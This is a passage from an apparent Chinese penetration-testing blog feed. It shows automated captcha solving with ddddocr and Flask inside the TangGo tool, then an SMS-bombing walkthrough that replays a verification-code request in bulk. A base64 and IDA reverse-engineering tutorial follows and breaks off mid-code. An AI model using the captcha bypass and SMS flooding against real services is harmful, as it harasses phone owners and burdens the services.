class="string">&quot;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&quot;</span></span><br><span class="line">    ocr = DdddOcr()</span><br><span class="line">    code = ocr.classification(base64.b64decode(base64_str))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(code)</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012232942.png" alt="image.png"> </p><p>也可以使用wireshark全局抓包，看到其实dddocr处理的就是图片的base64编码部分：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012233622.png" alt="image.png"> </p><p>2、这块新建流程，使用flask调用dddocr，实现验证码图片识别</p><p>对api请求获取识别后的验证码，丢入API请求后，在请求头中插入提取的image内容绑定的变量</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012233689.png" alt="img"> </p><p>绑定变量的时候要注意，需要选择【提取匹配正则表达式的数据】，然后将识别后的验证码通过正则提取出来</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012233767.png" alt="img"> </p><p>【注】这块要注意千万不要选择“提取完整响应数据”，这块的响应数据是响应包，不是响应体</p><h3 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a>完整流程</h3><p>获取到图形验证码响应体-&gt;提取ID &amp;&amp; 提取image-&gt;api接口识别验证码</p><h2 id="短信轰炸"><a href="#短信轰炸" class="headerlink" title="短信轰炸"></a>短信轰炸</h2><p>使用http抓包工具，抓取到发送验证码的数据包。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012233790.png" alt="image.png"> </p><p>将其发送到http模糊测试工具，在验证码请求的位置插入对应变量</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012233849.png" alt="img"> </p><p>设置爆破模式为【无值重放】模式：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012234744.png" alt="image.png"> </p><p>然后进入测试过程进行测试配置</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012234392.png" alt="image.png"> </p><p>点击【开始】成功爆破</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012234061.png" alt="image.png"> </p><p>可以点击查看请求参数，可以看到自定义流程中的数据都在此处有体现：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012234847.png" alt="image.png"> </p><p> <img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012244288.png" alt="image-20240601224441268"> </p><h1 id="四、总结"><a href="#四、总结" class="headerlink" title="四、总结"></a>四、总结</h1><p>整个流程中有几个地方需要注意一下，比较容易出问题。</p><h2 id="Bug-验证码识别的流程不能测试"><a href="#Bug-验证码识别的流程不能测试" class="headerlink" title="Bug-验证码识别的流程不能测试"></a>Bug-验证码识别的流程不能测试</h2><p>在前面自定义流程中，最后一个流程，设置变量，使用dddocr识别验证码</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012235449.png" alt="image.png"> </p><p>这块的【测试】选项，是没啥用的，加载不上我们设置的变量。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012235979.png" alt="img"> </p><p>可以wireshark抓包测试查看。</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012235007.png" alt="img"> </p><p>刚开始的时候，浪费了半个小时，一直搁那儿测试，找原因。原先以为是 re_image的正则写错了，排了好久，一直没有返回。原来是功能点的bug！</p><h2 id="tip-验证码识别结果正则匹配"><a href="#tip-验证码识别结果正则匹配" class="headerlink" title="tip-验证码识别结果正则匹配"></a>tip-验证码识别结果正则匹配</h2><p>还是同样的位置，需要注意绑定变量的时候，需要选择【提取匹配正则表达式的数据】，然后将识别后的验证码通过正则提取出来</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012235544.png" alt="img"> </p><p>这块千万不要选择“提取完整响应数据”，这块的响应数据指的是是响应包，不是响应体</p><p>这样子提取出来的就是整个响应数据包了，肯定不是我们要的东西。</p><h2 id="tip-自定义流程顺序很重要"><a href="#tip-自定义流程顺序很重要" class="headerlink" title="tip-自定义流程顺序很重要"></a>tip-自定义流程顺序很重要</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202406/202406012235530.png" alt="img"></p><p>1、get_yzm：通过接口获取到验证码响应体（包括code和codeid）</p><p>2、re_id：正则匹配，从get_yzm中获取到codeid</p><p>3、re_image：正则匹配，从get_yzm中获取到code的base64编码</p><p>4、get_image：通过flask调用ddddocr接口，识别验证码，获得code</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图片验证码 </tag>
            
            <tag> ddddocr </tag>
            
            <tag> TangGo </tag>
            
            <tag> 短信轰炸 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法还原之base64</title>
      <link href="/2024/05/16/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8Bbase64/"/>
      <url>/2024/05/16/%E7%AE%97%E6%B3%95%E8%BF%98%E5%8E%9F%E4%B9%8Bbase64/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h1 id="基础概念"><a href="#基础概念" class="headerlink" title="基础概念"></a>基础概念</h1><h2 id="加密与解密的关系"><a href="#加密与解密的关系" class="headerlink" title="加密与解密的关系"></a>加密与解密的关系</h2><ol><li><strong>加密</strong>：是将原始的、可读的信息（明文）转换为另一种形式（密文）的过程，这样就可以防止未授权的访问。加密算法和密钥用于这一转换过程。加密的目的是确保信息的机密性，即使密文在传输或存储过程中被截获，没有正确的密钥也无法理解其内容。</li><li><strong>解密</strong>：是加密的逆过程，它将密文转换回原始的明文。只有拥有正确密钥的人才能解密信息并获取原始内容。</li></ol><p>加密和解密的关系可以概括为以下几点：</p><ul><li><strong>互为逆过程</strong>：加密和解密使用相同类型的算法，但执行相反的操作。加密算法设计时必须确保可以逆向操作，以便解密。</li><li><strong>密钥的使用</strong>：加密和解密通常依赖于密钥。在加密过程中使用密钥生成密文，在解密过程中使用相同的密钥从密文恢复明文。密钥的安全管理是加密系统能否有效工作的关键。</li><li><strong>安全性</strong>：加密系统的设计目标是确保即使攻击者知道加密算法，也无法在没有密钥的情况下解密信息。因此，加密算法通常是公开的，而密钥则必须保密。</li><li><strong>应用场景</strong>：加密和解密广泛应用于多种场景，如网络安全中的数据传输、数据存储、数字签名等，以确保信息的保密性、完整性和可用性。</li></ul><p>在现代密码学中，加密和解密算法多种多样，包括对称加密（如AES）、非对称加密（如RSA）、散列函数等，它们在不同的应用场景中提供了不同级别的安全性。</p><h2 id="加密的简单分类"><a href="#加密的简单分类" class="headerlink" title="加密的简单分类"></a>加密的简单分类</h2><p>加密技术可以分为几个基本类别，每个类别都有其特定的用途和特点。以下是一些简单的分类：</p><ol><li><p><strong>对称加密（Symmetric Encryption）</strong>：</p><ul><li>使用相同的密钥进行加密和解密。</li></ul><ul><li><p>速度快，适用于大量数据的加密。</p></li><li><p>典型的算法包括AES（Advanced Encryption Standard）、DES（Data Encryption Standard）、3DES（Triple Data Encryption Algorithm）等。</p></li></ul></li><li><p><strong>非对称加密（Asymmetric Encryption）</strong>：</p><ul><li>使用一对密钥：公钥和私钥。公钥用于加密，私钥用于解密。</li></ul><ul><li><p>安全性高，但速度较慢，适用于小量数据的加密。</p></li><li><p>典型的算法包括RSA、ECC（Elliptic Curve Cryptography）、Diffie-Hellman等。</p></li></ul></li><li><p><strong>哈希函数（Hash Functions）</strong>：</p><ul><li>将输入（无论大小）映射到一个固定长度的哈希值。</li></ul><ul><li><p>用于确保数据的完整性，因为即使输入数据有很小的变化，哈希值也会发生显著变化。</p></li><li><p>不是加密算法，因为哈希是不可逆的，不能用于解密。</p></li><li><p>典型的算法包括MD5、SHA-1、SHA-256等。</p></li></ul></li></ol><h1 id="实现标准的base64"><a href="#实现标准的base64" class="headerlink" title="实现标准的base64"></a>实现标准的base64</h1><h2 id="1-base64原理"><a href="#1-base64原理" class="headerlink" title="1. base64原理"></a>1. base64原理</h2><p>Base64编码的原理是将每三个字节的数据（共24位）划分为四个6位的段，然后每个6位的段转换为一个对应的可打印字符。Base64编码表包含64个字符：<strong>大写字母A到Z</strong>、<strong>小写字母a到z</strong>、<strong>数字0到9</strong>、<strong>加号（+）和斜杠（&#x2F;）</strong>。</p><p>下面是一个Python的代码示例，展示了如何实现标准的base64编码和解码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 编码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode_base64</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解码</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_base64</span>(<span class="params">encoded_data</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(encoded_data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 示例</span></span><br><span class="line">original_data = <span class="string">b&#x27;Hello, World!&#x27;</span></span><br><span class="line">encoded_data = encode_base64(original_data)</span><br><span class="line">decoded_data = decode_base64(encoded_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Original data: <span class="subst">&#123;original_data&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Encoded data: <span class="subst">&#123;encoded_data&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Decoded data: <span class="subst">&#123;decoded_data&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>注意，Base64编码并不是一种加密方法，它不提供数据的安全性，只是将数据转换成一种适合在不同系统间传输的格式</p><h2 id="2-示例说明"><a href="#2-示例说明" class="headerlink" title="2. 示例说明"></a>2. 示例说明</h2><p>假设要对字符串 “Man” 进行base64编码，整个过程如下所示：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161502428.jpeg" alt="img"> </p><p>第一步：“M”、“a”、”n”对应的ASCII码值分别为77，97，110，对应的二进制值是01001101、01100001、01101110。如图第二三行所示，由此组成一个24位的二进制字符串。</p><p>第二步：如图红色框，将24位每6位二进制位一组分成四组。</p><p>第三步：在上面每一组前面补两个0，扩展成32个二进制位，此时变为四个字节：00010011、00010110、00000101、00101110。分别对应的值（Base64编码索引）为：19、22、5、46。</p><p>第四步：用上面的值在Base64编码表中进行查找，分别对应：T、W、F、u。因此“Man”Base64编码之后就变为：TWFu。</p><p><strong>位数不足情况</strong></p><p>上面是按照三个字节来举例说明的，如果字节数不足三个，那么该如何处理？</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161503074.png" alt="img"> </p><p><strong>两个字节</strong>：两个字节共16个二进制位，依旧按照规则进行分组。此时总共16个二进制位，每6个一组，则第三组缺少2位，用0补齐，得到三个Base64编码，第四组完全没有数据则用 “&#x3D;” 补上。因此，上图中“BC”转换之后为“QKM&#x3D;”；</p><p><strong>一个字节</strong>：一个字节共8个二进制位，依旧按照规则进行分组。此时共8个二进制位，每6个一组，则第二组缺少4位，用0补齐，得到两个Base64编码，而后面两组没有对应数据，都用“&#x3D;”补上。因此，上图中“A”转换之后为“QQ&#x3D;&#x3D;”；</p><h2 id="3-base64实现"><a href="#3-base64实现" class="headerlink" title="3. base64实现"></a>3. base64实现</h2><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161514951.png" alt="image.png"> </p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义base64的种子</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> base64en[] = &#123;</span><br><span class="line">        <span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>,  <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>,  <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>,   <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>,  <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;/&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//base64加密函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">base64_enc</span><span class="params">(<span class="type">char</span> *data, <span class="type">int</span> len, <span class="type">char</span> *out)</span></span>&#123;</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;  <span class="comment">//定义out的索引</span></span><br><span class="line">    <span class="type">char</span> last_c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> c = <span class="number">0</span>;   </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        c = data[i];</span><br><span class="line">        <span class="keyword">switch</span> (i % <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                out[index++] = base64en[(c &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3f</span> ];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                out[index++] = base64en[((last_c &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>) | ((c &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xf</span> )];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                out[index++] = base64en[( ( last_c &amp; <span class="number">0xf</span> ) &lt;&lt; <span class="number">2</span> ) | ((c &gt;&gt; <span class="number">6</span> ) &amp; <span class="number">0x3</span>)];</span><br><span class="line">                out[index++] = base64en[c &amp; <span class="number">0x3f</span>];</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        last_c = c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(len % <span class="number">3</span> == <span class="number">1</span>)&#123;</span><br><span class="line">        out[index++] = base64en[(c &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">4</span>];</span><br><span class="line">        out[index++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">        out[index++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (len % <span class="number">3</span> == <span class="number">2</span>)&#123;</span><br><span class="line">        out[index++] = base64en[( c &amp; <span class="number">0xf</span> ) &lt;&lt; <span class="number">2</span>];</span><br><span class="line">        out[index++] = <span class="string">&#x27;=&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">JNIEXPORT jstring JNICALL</span><br><span class="line"><span class="comment">//可以看到有三个参数：</span></span><br><span class="line">    <span class="comment">//①JNI *env表示java环境；</span></span><br><span class="line">    <span class="comment">//②jobject thiz这块对应函数名，如果是static静态方法，这块参数将为jclass claz。非static方法则为jobject thiz</span></span><br><span class="line">    <span class="comment">//③传入真正的参数</span></span><br><span class="line"><span class="built_in">Java_com_roysue_base64_MainActivity_base64_1enc</span>(JNIEnv *env, jobject thiz, jstring data) &#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> implement base64_enc()</span></span><br><span class="line">    <span class="type">char</span> *c_data = <span class="built_in">const_cast</span>&lt;<span class="type">char</span> *&gt;(env-&gt;<span class="built_in">GetStringUTFChars</span>(data, <span class="number">0</span>));  <span class="comment">//将java层的data参数传入到C中，并进行类型强转</span></span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(c_data);  <span class="comment">//定义c_data的长度</span></span><br><span class="line">    <span class="type">char</span> out[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">base64_enc</span>(c_data,len,out);  <span class="comment">//调用base64_enc进行base64编码</span></span><br><span class="line">    env-&gt;<span class="built_in">ReleaseStringUTFChars</span>(data,c_data);  <span class="comment">//进行内存的释放，将前面定义的变量进行释放</span></span><br><span class="line">    <span class="keyword">return</span> env-&gt;<span class="built_in">NewStringUTF</span>(out);  <span class="comment">//得到加密后的值</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>代码介绍：</strong></p><p>由于base64编码是将编码前的3*8位数据，分解成4个6位的数据，所以经过base64编码后的字符串长度是4的倍数。</p><p>但往往进行编码的数据长度并不是3的倍数，这就造成了“编码”后的位数不为4的倍数，比如 “Brisk” 共5×8&#x3D;40位，以6位为一组可以分为7组，这样“编码”后就有7个字符，但base64编码后的字符长度应该是4的倍数，显然这里就出问题了，那么怎么办呢？前面的不可以抛弃掉，所以就只有“追加”了，所以Brisk经过base64编码后的长度应该是8个字符，而第8个编码后的字符是’&#x3D;’，再比如对单个字符a进行base64编码，由于它的长度不是3的倍数，以3个字节为一组它只能分一组，再以6位为一位它只能分两组，所以经过“编码”后它的长度是2，但base64编码后的个数应该是4的倍数，所以它的长度应该是4，所以在后面补上两个‘&#x3D;’,由于一个数求余3后有三个不同的结果，0、1、2，所以在对一个数据进行base64进行编码后它的长度为：</p><p>（1）当进行编码的数据长度是3的倍数时，len&#x3D;strlen(str_in)&#x2F;3*4;</p><p>（2）当进行编码的数据长度不是3的倍数时，len&#x3D;(strlen(str_in)&#x2F;3+1)*4;</p><p>上面的代码实现分为了两个部分：</p><p>第一部分：输入数据长度是3的倍数，按照base64的原理对数据进行移位操作，转换承对应的base64编码</p><p>第二部分：如果不是3的倍数，也就意味（len % 3 &#x3D;&#x3D; 1）或者（len % 3 &#x3D;&#x3D; 2），则需要在后面补充对应的 “&#x3D;”</p><h1 id="base64逆向识别—IDA"><a href="#base64逆向识别—IDA" class="headerlink" title="base64逆向识别—IDA"></a>base64逆向识别—IDA</h1><h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h2><p>将前面写好的代码打包成apk后，解压，拿到里面的so文件，利用IDA进行分析：</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745544.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745698.png" alt="image.png"> </p><p>1、将so文件拖入到IDA中</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745356.png" alt="image.png"> </p><p>2、找到我们定义好的导出函数 base64_enc。</p><p>可以看到从java层到so层，函数的命名会发生一定变化，在so层叫做 “Java_com_roysue_base64_MainActivity_base64_1enc”(Java_包名_函数名)</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745469.png" alt="image.png"> </p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745189.png" alt="image.png"> </p><p>3、找到了具体的base64的实现流程：base64_enc(s, v4, (char *)v8);</p><ul><li>s：传入的字符串data</li><li>v4：字符串长度</li><li>(char*)v8：保存输出内容的变量</li></ul><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161745751.png" alt="img"> </p><p>用了“<em>Z10base64_encPciS</em>(a1, a2, a3);”函数</p><p><img src="https://gitee.com/jingweihang/img/raw/master/hexo/202405/202405161746949.png" alt="image.png"> </p><h2 id="2-base64-enc"><a href="#2-base64-enc" class="headerlink" title="2. base64_enc"></a>2. base64_enc</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> *__fastcall <span class="title function_">base64_enc</span><span class="params">(<span class="type">char</span> *data, <span class="type">int</span> len, <span class="type">char</span> *out)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">char</span> *result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+0h] [bp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [sp+4h] [bp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v9; <span class="comment">// [sp+Ah] [bp-12h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v10; <span class="comment">// [sp+Bh] [bp-11h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [sp+Ch] [bp-10h]</span></span><br><span class="line"></span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = data[i];</span><br><span class="line">    v7 = i % <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i % <span class="number">3</span> 